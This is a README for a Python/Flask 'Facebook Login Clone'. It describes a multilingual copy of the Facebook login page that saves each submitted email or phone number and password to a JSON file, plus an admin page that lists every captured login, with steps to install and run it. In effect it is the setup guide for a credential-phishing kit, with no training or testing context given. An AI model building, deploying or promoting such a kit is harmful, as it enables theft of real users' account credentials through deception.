# Facebook Login Clone — Python Backend

## Project Structure
```
fb-login-python/
├── server.py          ← Backend (Python + Flask)
├── logins.json        ← Where logins are saved (auto-created)
└── public/
    ├── index.html     ← The Facebook login page
    └── admin.html     ← Admin panel to view all logins
```

## How to Run

### Step 1 — Make sure Python is installed
```
python --version
```
You need Python 3.x. If not installed: https://python.org

### Step 2 — Install Flask (only once)
```
pip install flask flask-cors
```

### Step 3 — Start the server
```
python server.py
```
You'll see:
```
✅ Server running at http://localhost:3000
📋 Admin panel at http://localhost:3000/admin
```

### Step 4 — Open in browser
- Login page:  http://localhost:3000
- Admin panel: http://localhost:3000/admin

## Languages supported
English (UK), Français, Español, Deutsch, Português, العربية, 中文简体

## How it works
1. User fills in email/phone + password and clicks Log in
2. Python (Flask) saves the data to logins.json with a timestamp
3. View all saved entries at http://localhost:3000/admin
